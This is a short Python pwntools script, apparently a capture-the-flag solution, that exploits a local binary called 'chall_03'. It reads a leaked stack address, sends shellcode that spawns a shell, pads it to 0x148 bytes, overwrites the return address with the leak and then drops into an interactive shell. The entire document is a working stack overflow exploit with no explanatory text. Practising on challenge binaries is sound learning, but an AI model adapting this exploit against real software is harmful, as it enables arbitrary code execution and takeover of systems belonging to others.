from pwn import *

p = process('./chall_03')

binary = context.binary = ELF('./chall_03')

p.recvline()
p.recvuntil("Here's a leak :)")
_ = p.recvline().strip()
stack = int(_,16)

payload = b''
payload += asm(shellcraft.sh())
payload += (0x148 - len(payload)) * b'A'
payload += p64(stack)

p.sendline(payload)
p.interactive()
